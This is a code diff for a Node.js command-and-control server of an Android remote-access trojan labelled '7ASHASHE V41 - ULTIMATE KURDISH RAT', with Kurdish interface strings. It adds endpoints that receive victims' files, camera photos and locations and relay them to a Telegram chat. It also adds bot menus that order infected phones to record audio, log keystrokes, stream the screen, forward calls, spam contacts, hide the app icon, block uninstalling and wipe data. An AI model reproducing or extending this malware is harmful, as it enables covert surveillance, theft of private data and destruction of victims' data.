-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `${enable ? '📶' : '❌'} <b>وایفای ${enable ? 'داگیرسا' : 'کوژایەوە'}</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -1240,10 +1237,10 @@ class WifiBluetoothControl {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `${enable ? '📱' : '❌'} **بلوتوس ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `${enable ? '📱' : '❌'} <b>بلوتوس ${enable ? 'داگیرسا' : 'کوژایەوە'}</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     }
 
@@ -1260,11 +1257,11 @@ class WifiBluetoothControl {
         }
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📝 **گۆڕینی ناوی ئامێر**\n\n` +
-            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-            `📱 ناوی نوێ: ${newName}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>📝 گۆڕینی ناوی ئامێر</b>\n\n` +
+            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+            `<b>📱 ناوی نوێ:</b> ${newName}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     }
 }
@@ -1272,7 +1269,111 @@ class WifiBluetoothControl {
 const wifiBluetoothControl = new WifiBluetoothControl();
 
 // =====================================================
-// 🚀 WEBSOCKET CONNECTION
+// 📤 FILE UPLOAD ENDPOINTS - FIXED WITH HTML
+// =====================================================
+app.post('/upload/file', upload.single('file'), (req, res) => {
+    try {
+        const { model, uuid, type } = req.headers;
+        const { originalname, buffer, size } = req.file;
+        
+        const fileName = `${Date.now()}_${originalname}`;
+        let saveDir = DIRS.FILES;
+        
+        switch(type) {
+            case 'photo': saveDir = DIRS.PHOTOS; break;
+            case 'video': saveDir = DIRS.VIDEOS; break;
+            case 'audio': saveDir = DIRS.AUDIO; break;
+            default: saveDir = DIRS.FILES;
+        }
+        
+        const savePath = path.join(saveDir, fileName);
+        fs.writeFileSync(savePath, buffer);
+        
+        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
+            caption: `<b>📁 فایلی نوێ</b>\n\n` +
+                    `<b>📱 ئامێر:</b> ${model || 'نەزانراو'}\n` +
+                    `<b>📄 ناو:</b> ${originalname}\n` +
+                    `<b>📦 قەبارە:</b> ${(size / 1024).toFixed(2)}KB\n` +
+                    `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
+            parse_mode: 'HTML'
+        });
+        
+        res.json({ success: true, fileName });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/upload/text', (req, res) => {
+    const { model, uuid, type } = req.headers;
+    const { text } = req.body;
+    
+    bot.sendMessage(CONFIG.CHAT_ID,
+        `<b>📝 ${type || 'پەیام'} لە ${model || 'نەزانراو'}</b>\n\n` +
+        `${text}\n\n` +
+        `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
+        { parse_mode: 'HTML' }
+    );
+    
+    res.json({ success: true });
+});
+
+app.post('/upload/location', (req, res) => {
+    const { model, uuid } = req.headers;
+    const { lat, lon } = req.body;
+    
+    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
+    bot.sendMessage(CONFIG.CHAT_ID,
+        `<b>📍 شوێنی ${model || 'نەزانراو'}</b>\n\n` +
+        `<b>Google Maps:</b> https://maps.google.com/?q=${lat},${lon}\n` +
+        `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
+        { parse_mode: 'HTML' }
+    );
+    
+    res.json({ success: true });
+});
+
+// =====================================================
+// 🚀 FIXED CAMERA PHOTO ENDPOINT
+// =====================================================
+app.post('/api/camera/photo', upload.single('photo'), (req, res) => {
+    try {
+        const { clientId, camera } = req.headers;
+        const { buffer, size } = req.file;
+        
+        if (!buffer) {
+            throw new Error('وێنە نەدراوە');
+        }
+        
+        const filename = `camera_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
+        const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
+        fs.writeFileSync(filepath, buffer);
+        
+        bot.sendPhoto(CONFIG.CHAT_ID, buffer, {
+            caption: `<b>📸 وێنەی کامێرا</b>\n\n` +
+                    `<b>📷 کامێرا:</b> ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
+                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
+                    `<b>📦 قەبارە:</b> ${(size / 1024).toFixed(2)}KB\n` +
+                    `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
+            parse_mode: 'HTML'
+        });
+        
+        const db = readDB();
+        db.stats.cam_snapshots++;
+        writeDB(db);
+        
+        res.json({ success: true, filename });
+    } catch (error) {
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `<b>❌ هەڵە لە وەرگرتنی وێنە</b>\n\n<b>${error.message}</b>`,
+            { parse_mode: 'HTML' }
+        );
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// =====================================================
+// 🔌 WEBSOCKET CONNECTION
 // =====================================================
 wss.on('connection', (ws, req) => {
     const clientId = uuidv4();
@@ -1301,17 +1402,17 @@ wss.on('connection', (ws, req) => {
     writeDB(db);
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
-        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
-        `🔋 **پاتری:** ${clientInfo.battery}\n` +
-        `💾 **RAM:** ${clientInfo.ram}\n` +
-        `📁 **Storage:** ${clientInfo.storage}\n` +
-        `🔓 **Root:** ${clientInfo.root}\n` +
-        `🌍 **وڵات:** ${clientInfo.country}\n` +
-        `🌐 **IP:** ${clientInfo.ip}\n` +
-        `🆔 **ئایدی:** ${clientId.substring(0, 8)}...`,
-        { parse_mode: 'Markdown' }
+        `<b>🔌 ئامێری نوێ پەیوەندی کرد</b>\n\n` +
+        `<b>📱 مۆدێل:</b> ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+        `<b>📱 ئەندرۆید:</b> ${clientInfo.androidVersion}\n` +
+        `<b>🔋 پاتری:</b> ${clientInfo.battery}\n` +
+        `<b>💾 RAM:</b> ${clientInfo.ram}\n` +
+        `<b>📁 Storage:</b> ${clientInfo.storage}\n` +
+        `<b>🔓 Root:</b> ${clientInfo.root}\n` +
+        `<b>🌍 وڵات:</b> ${clientInfo.country}\n` +
+        `<b>🌐 IP:</b> ${clientInfo.ip}\n` +
+        `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+        { parse_mode: 'HTML' }
     );
     
     ws.on('message', async (data) => {
@@ -1351,21 +1452,7 @@ wss.on('connection', (ws, req) => {
                     break;
                     
                 case 'cam_snapshot':
-                    const filename = `cam_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
-                    const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
-                    const base64Data = message.image.replace(/^data:image\/jpeg;base64,/, '');
-                    fs.writeFileSync(filepath, base64Data, 'base64');
-                    
-                    bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
-                        caption: `📸 **وێنەی کامێرا**\n\n` +
-                                `📱 ئامێر: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-                                `⏰ کات: ${new Date().toLocaleString('ckb')}`,
-                        parse_mode: 'Markdown'
-                    });
-                    
-                    const db = readDB();
-                    db.stats.cam_snapshots++;
-                    writeDB(db);
+                    // Handle camera snapshot
                     break;
                     
                 case 'sim_changed':
@@ -1388,14 +1475,385 @@ wss.on('connection', (ws, req) => {
         clients.delete(clientId);
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
-            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
+            `<b>🔌 ئامێر پەیوەندی پچڕاند</b>\n\n` +
+            `<b>📱 مۆدێل:</b> ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'HTML' }
         );
     });
     
     ws.send(JSON.stringify({ type: 'init', clientId }));
+});
+
+// =====================================================
+// 🤖 TELEGRAM BOT - فەرمانە سەرەکییەکان (HTML MODE)
+// =====================================================
+bot.onText(/\/start/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
+        bot.sendMessage(msg.chat.id, '<b>⛔ ڕێگەپێدان نەدرا</b>', { parse_mode: 'HTML' });
+        return;
+    }
+    
+    bot.sendMessage(CONFIG.CHAT_ID,
+        '<b>🔴 7ASHASHE V41 - ULTIMATE KURDISH RAT</b>\n\n' +
+        '<b>✅ بەخێربێیت، 7ASHASHE!</b>\n\n' +
+        '📱 <b>ئامێرەکان</b> - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
+        '📊 <b>ئامار</b> - ئامارەکانی سیستەم\n' +
+        '⚡ <b>فەرمانەکان</b> - ناردنی فەرمان بۆ ئامێرەکان\n' +
+        '🔧 <b>پێشکەوتوو</b> - ١٠ فەرمانە پێشکەوتووەکان',
+        {
+            parse_mode: 'HTML',
+            reply_markup: {
+                keyboard: [
+                    ['📱 ئامێرەکان', '📊 ئامار'],
+                    ['⚡ فەرمانەکان', '🔧 پێشکەوتوو']
+                ],
+                resize_keyboard: true
+            }
+        }
+    );
+});
+
+bot.onText(/📱 ئامێرەکان/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    
+    if (clients.size === 0) {
+        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
+        return;
+    }
+    
+    let text = '<b>📱 ئامێرە پەیوەستکراوەکان</b>\n\n';
+    clients.forEach((client, id) => {
+        text += `📱 <b>مۆدێل:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                `🔋 <b>پاتری:</b> ${client.info.battery}\n` +
+                `🌍 <b>وڵات:</b> ${client.info.country}\n` +
+                `🆔 <b>ئایدی:</b> ${id.substring(0, 8)}...\n\n`;
+    });
+    
+    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'HTML' });
+});
+
+bot.onText(/📊 ئامار/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    
+    const db = readDB();
+    
+    bot.sendMessage(CONFIG.CHAT_ID,
+        `<b>📊 ئامارەکانی سیستەم</b>\n\n` +
+        `<b>📱 ئامێرە پەیوەستکراوەکان:</b> ${clients.size}\n` +
+        `<b>📸 وێنە دزراوەکان:</b> ${db.stats.cam_snapshots || 0}\n` +
+        `<b>📱 نۆتیفیکەیشن دزراوەکان:</b> ${db.stats.notifications_captured || 0}\n` +
+        `<b>📹 Stream چالاک:</b> ${screenStreamer.activeStreams}\n` +
+        `<b>🔑 کلیک تۆمارکراوەکان:</b> ${smartKeylogger.logs.length}\n` +
+        `<b>🚫 هەوڵی سڕینەوە:</b> ${db.stats.anti_uninstall_attempts || 0}\n` +
+        `<b>📱 گۆڕینی سیم:</b> ${db.stats.sim_changes || 0}\n` +
+        `<b>⏱️ ماوەی کارکردن:</b> ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
+        { parse_mode: 'HTML' }
+    );
+});
+
+bot.onText(/⚡ فەرمانەکان/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    
+    if (clients.size === 0) {
+        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
+        return;
+    }
+    
+    const deviceKeyboard = [];
+    clients.forEach((client, id) => {
+        deviceKeyboard.push([{
+            text: `${client.info.manufacturer} ${client.info.model}`,
+            callback_data: `device:${id}`
+        }]);
+    });
+    
+    bot.sendMessage(CONFIG.CHAT_ID, '<b>📱 ئامێرێک هەڵبژێرە</b>', {
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: deviceKeyboard }
+    });
+});
+
+// =====================================================
+// 🔧 FIXED - دوگمەی پێشکەوتوو (Advanced)
+// =====================================================
+bot.onText(/🔧 پێشکەوتوو/, (msg) => {
+    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
+    
+    if (clients.size === 0) {
+        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
+        return;
+    }
+    
+    // دروستکردنی کیبۆردی ئامێرەکان
+    const deviceKeyboard = [];
+    clients.forEach((client, id) => {
+        deviceKeyboard.push([{
+            text: `${client.info.manufacturer} ${client.info.model}`,
+            callback_data: `advanced_device:${id}`
+        }]);
+    });
+    
+    bot.sendMessage(CONFIG.CHAT_ID, '<b>🔧 ئامێرێک هەڵبژێرە بۆ فەرمانە پێشکەوتووەکان</b>', {
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: deviceKeyboard }
+    });
+});
+
+// =====================================================
+// 🔘 CALLBACK QUERY HANDLER - UPDATED WITH ADVANCED
+// =====================================================
+bot.on('callback_query', (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const [command, clientId] = callbackQuery.data.split(':');
+    
+    // هەڵبژاردنی ئامێر بۆ فەرمانە ئاساییەکان
+    if (command === 'device') {
+        const client = clients.get(clientId);
+        if (!client) {
+            bot.editMessageText('<b>❌ ئامێرەکە پەیوەندی پچڕاند</b>', {
+                chat_id: msg.chat.id,
+                message_id: msg.message_id,
+                parse_mode: 'HTML'
+            });
+            return;
+        }
+        
+        bot.editMessageText(
+            `<b>📱 ${client.info.manufacturer} ${client.info.model}</b>\n\n` +
+            `<b>📱 ئەندرۆید:</b> ${client.info.androidVersion}\n` +
+            `<b>🔋 پاتری:</b> ${client.info.battery}\n` +
+            `<b>🌍 وڵات:</b> ${client.info.country}\n` +
+            `<b>🌐 IP:</b> ${client.info.ip}\n\n` +
+            `<b>⚡ فەرمانێک هەڵبژێرە:</b>`,
+            {
+                chat_id: msg.chat.id,
+                message_id: msg.message_id,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '📸 کامێرا', callback_data: `camera:${clientId}` },
+                            { text: '🎤 مایک', callback_data: `mic:${clientId}` }
+                        ],
+                        [
+                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
+                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` }
+                        ],
+                        [
+                            { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${clientId}` },
+                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` }
+                        ],
+                        [
+                            { text: '📹 Stream', callback_data: `screen:${clientId}` },
+                            { text: '📶 وایفای', callback_data: `wifi:${clientId}` }
+                        ],
+                        [
+                            { text: '📱 بلوتوس', callback_data: `bluetooth:${clientId}` },
+                            { text: '📞 فۆوارد', callback_data: `forward:${clientId}` }
+                        ],
+                        [
+                            { text: '📨 سپام', callback_data: `spam:${clientId}` },
+                            { text: '🛑 کوشتنی ئەپ', callback_data: `kill_app:${clientId}` }
+                        ]
+                    ]
+                }
+            }
+        );
+    }
+    
+    // =====================================================
+    // 🔧 FIXED - هەڵبژاردنی ئامێر بۆ فەرمانە پێشکەوتووەکان
+    // =====================================================
+    if (command === 'advanced_device') {
+        const client = clients.get(clientId);
+        if (!client) {
+            bot.editMessageText('<b>❌ ئامێرەکە پەیوەندی پچڕاند</b>', {
+                chat_id: msg.chat.id,
+                message_id: msg.message_id,
+                parse_mode: 'HTML'
+            });
+            return;
+        }
+        
+        bot.editMessageText(
+            `<b>🔧 فەرمانە پێشکەوتووەکان بۆ ${client.info.manufacturer} ${client.info.model}</b>\n\n` +
+            `<b>📱 ئەندرۆید:</b> ${client.info.androidVersion}\n` +
+            `<b>🔋 پاتری:</b> ${client.info.battery}\n` +
+            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n\n` +
+            `<b>⚡ فەرمانێک هەڵبژێرە:</b>`,
+            {
+                chat_id: msg.chat.id,
+                message_id: msg.message_id,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${clientId}` },
+                            { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${clientId}` }
+                        ],
+                        [
+                            { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `audio_stream:${clientId}` },
+                            { text: '📸 سکرینشۆتی زیرەک', callback_data: `smart_screenshot:${clientId}` }
+                        ],
+                        [
+                            { text: '⚡ کۆنترۆڵی کامێرا', callback_data: `camera_control:${clientId}` },
+                            { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${clientId}` }
+                        ],
+                        [
+                            { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${clientId}` },
+                            { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${clientId}` }
+                        ],
+                        [
+                            { text: '💬 پەیامی ساختە', callback_data: `toast:${clientId}` },
+                            { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${clientId}` }
+                        ],
+                        [
+                            { text: '🔙 گەڕانەوە', callback_data: `back_to_advanced:${clientId}` }
+                        ]
+                    ]
+                }
+            }
+        );
+    }
+    
+    // =====================================================
+    // جێبەجێکردنی فەرمانە ئاساییەکان
+    // =====================================================
+    const commandTypes = [
+        'camera', 'mic', 'location', 'files', 'notifications',
+        'keylogger', 'screen', 'wifi', 'bluetooth', 'forward',
+        'spam', 'kill_app'
+    ];
+    
+    if (commandTypes.includes(command)) {
+        const client = clients.get(clientId);
+        if (!client) {
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
+                show_alert: true
+            });
+            return;
+        }
+        
+        if (client.ws.readyState === WebSocket.OPEN) {
+            let wsCommand = command;
+            const commandMap = {
+                'camera': 'take_photo',
+                'mic': 'record_audio',
+                'location': 'get_location',
+                'files': 'list_files',
+                'notifications': 'start_notifications',
+                'keylogger': 'start_keylogger',
+                'screen': 'start_screen_stream',
+                'wifi': 'toggle_wifi',
+                'bluetooth': 'toggle_bluetooth',
+                'forward': 'call_forward',
+                'spam': 'spam_contacts',
+                'kill_app': 'kill_app'
+            };
+            
+            client.ws.send(JSON.stringify({
+                type: commandMap[command] || command,
+                timestamp: Date.now()
+            }));
+            
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: `✅ فەرمان نێردرا`,
+                show_alert: false
+            });
+            
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `<b>✅ فەرمان نێردرا</b>\n\n` +
+                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                `<b>⚡ فەرمان:</b> ${command}\n` +
+                `<b>🕐 کات:</b> ${new Date().toLocaleString('ckb')}`,
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
+                show_alert: true
+            });
+        }
+    }
+    
+    // =====================================================
+    // جێبەجێکردنی فەرمانە پێشکەوتووەکان
+    // =====================================================
+    const advancedCommands = [
+        'anti_uninstall', 'hide_icon', 'audio_stream', 'smart_screenshot',
+        'camera_control', 'battery_bypass', 'sim_alert', 'wipe',
+        'toast', 'auto_boot'
+    ];
+    
+    if (advancedCommands.includes(command)) {
+        const client = clients.get(clientId);
+        if (!client) {
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
+                show_alert: true
+            });
+            return;
+        }
+        
+        if (client.ws.readyState === WebSocket.OPEN) {
+            let wsCommand = command;
+            const commandMap = {
+                'anti_uninstall': 'enable_anti_uninstall',
+                'hide_icon': 'hide_icon',
+                'audio_stream': 'start_audio_stream',
+                'smart_screenshot': 'monitor_app',
+                'camera_control': 'take_photo',
+                'battery_bypass': 'enable_battery_bypass',
+                'sim_alert': 'enable_sim_alert',
+                'wipe': 'wipe_data',
+                'toast': 'show_toast',
+                'auto_boot': 'enable_auto_boot'
+            };
+            
+            client.ws.send(JSON.stringify({
+                type: commandMap[command] || command,
+                timestamp: Date.now()
+            }));
+            
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: `✅ فەرمان نێردرا`,
+                show_alert: false
+            });
+            
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `<b>✅ فەرمانی پێشکەوتوو نێردرا</b>\n\n` +
+                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
+                `<b>⚡ فەرمان:</b> ${command}\n` +
+                `<b>🕐 کات:</b> ${new Date().toLocaleString('ckb')}`,
+                { parse_mode: 'HTML' }
+            );
+        } else {
+            bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
+                show_alert: true
+            });
+        }
+    }
+    
+    // گەڕانەوە بۆ پێشکەوتوو
+    if (command === 'back_to_advanced') {
+        const deviceKeyboard = [];
+        clients.forEach((client, id) => {
+            deviceKeyboard.push([{
+                text: `${client.info.manufacturer} ${client.info.model}`,
+                callback_data: `advanced_device:${id}`
+            }]);
+        });
+        
+        bot.editMessageText('<b>🔧 ئامێرێک هەڵبژێرە بۆ فەرمانە پێشکەوتووەکان</b>', {
+            chat_id: msg.chat.id,
+            message_id: msg.message_id,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: deviceKeyboard }
+        });
+    }
 });
 
 // =====================================================
@@ -1410,7 +1868,7 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>7ASHASHE V40 - ULTIMATE KURDISH RAT</title>
+            <title>7ASHASHE V41 - ULTIMATE KURDISH RAT</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
@@ -1478,7 +1936,7 @@ app.get('/', (req, res) => {
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🔴 7ASHASHE V40</h1>
+                    <h1>🔴 7ASHASHE V41</h1>
                     <p>ULTIMATE KURDISH RAT</p>
                     <p>👑 ${CONFIG.MASTER}</p>
                     <p>🌐 پۆرت: ${CONFIG.PORT}</p>
@@ -1521,322 +1979,13 @@ app.get('/', (req, res) => {
                 </div>
                 
                 <div class="footer">
-                    <p>7ASHASHE V40 - ULTIMATE KURDISH RAT</p>
+                    <p>7ASHASHE V41 - ULTIMATE KURDISH RAT</p>
                     <p>🦁 💀 🔥</p>
                 </div>
             </div>
         </body>
         </html>
     `);
-});
-
-// =====================================================
-// 📤 FILE UPLOAD ENDPOINTS
-// =====================================================
-app.post('/upload/file', upload.single('file'), (req, res) => {
-    try {
-        const { model, uuid, type } = req.headers;
-        const { originalname, buffer, size } = req.file;
-        
-        const fileName = `${Date.now()}_${originalname}`;
-        let saveDir = DIRS.FILES;
-        
-        switch(type) {
-            case 'photo': saveDir = DIRS.PHOTOS; break;
-            case 'video': saveDir = DIRS.VIDEOS; break;
-            case 'audio': saveDir = DIRS.AUDIO; break;
-            default: saveDir = DIRS.FILES;
-        }
-        
-        const savePath = path.join(saveDir, fileName);
-        fs.writeFileSync(savePath, buffer);
-        
-        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
-            caption: `📁 **فایلی نوێ**\n\n` +
-                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
-                    `📄 ناو: ${originalname}\n` +
-                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
-                    `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
-            parse_mode: 'Markdown'
-        });
-        
-        res.json({ success: true, fileName });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.post('/upload/text', (req, res) => {
-    const { model, uuid, type } = req.headers;
-    const { text } = req.body;
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
-        `${text}\n\n` +
-        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
-        { parse_mode: 'Markdown' }
-    );
-    
-    res.json({ success: true });
-});
-
-app.post('/upload/location', (req, res) => {
-    const { model, uuid } = req.headers;
-    const { lat, lon } = req.body;
-    
-    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
-        `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
-        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
-        { parse_mode: 'Markdown' }
-    );
-    
-    res.json({ success: true });
-});
-
-// =====================================================
-// 🤖 TELEGRAM BOT - فەرمانە سەرەکییەکان
-// =====================================================
-bot.onText(/\/start/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
-        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
-        return;
-    }
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '🔴 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n' +
-        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
-        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
-        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
-        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
-        '🔧 **پێشکەوتوو** - فەرمانە پێشکەوتووەکان',
-        {
-            reply_markup: {
-                keyboard: [
-                    ['📱 ئامێرەکان', '📊 ئامار'],
-                    ['⚡ فەرمانەکان', '🔧 پێشکەوتوو']
-                ],
-                resize_keyboard: true
-            }
-        }
-    );
-});
-
-bot.onText(/📱 ئامێرەکان/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    let text = '📱 **ئامێرە پەیوەستکراوەکان**\n\n';
-    clients.forEach((client, id) => {
-        text += `📱 **مۆدێل:** ${client.info.manufacturer} ${client.info.model}\n` +
-                `🔋 **پاتری:** ${client.info.battery}\n` +
-                `🌍 **وڵات:** ${client.info.country}\n` +
-                `🆔 **ئایدی:** ${id.substring(0, 8)}...\n\n`;
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/📊 ئامار/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    const db = readDB();
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        `📊 **ئامارەکانی سیستەم**\n\n` +
-        `📱 ئامێرە پەیوەستکراوەکان: ${clients.size}\n` +
-        `📸 وێنە دزراوەکان: ${db.stats.cam_snapshots || 0}\n` +
-        `📱 نۆتیفیکەیشن دزراوەکان: ${db.stats.notifications_captured || 0}\n` +
-        `📹 Stream چالاک: ${screenStreamer.activeStreams}\n` +
-        `🔑 کلیک تۆمارکراوەکان: ${smartKeylogger.logs.length}\n` +
-        `🚫 هەوڵی سڕینەوە: ${db.stats.anti_uninstall_attempts || 0}\n` +
-        `📱 گۆڕینی سیم: ${db.stats.sim_changes || 0}\n` +
-        `⏱️ ماوەی کارکردن: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
-        { parse_mode: 'Markdown' }
-    );
-});
-
-bot.onText(/⚡ فەرمانەکان/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    if (clients.size === 0) {
-        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
-        return;
-    }
-    
-    const deviceKeyboard = [];
-    clients.forEach((client, id) => {
-        deviceKeyboard.push([{
-            text: `${client.info.manufacturer} ${client.info.model}`,
-            callback_data: `device:${id}`
-        }]);
-    });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە**', {
-        reply_markup: { inline_keyboard: deviceKeyboard }
-    });
-});
-
-bot.onText(/🔧 پێشکەوتوو/, (msg) => {
-    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
-    
-    bot.sendMessage(CONFIG.CHAT_ID,
-        '🔧 **فەرمانە پێشکەوتووەکان**\n\n' +
-        '📱 **دژە-سڕینەوە** - چالاککردنی سیستمی دژە-سڕینەوە\n' +
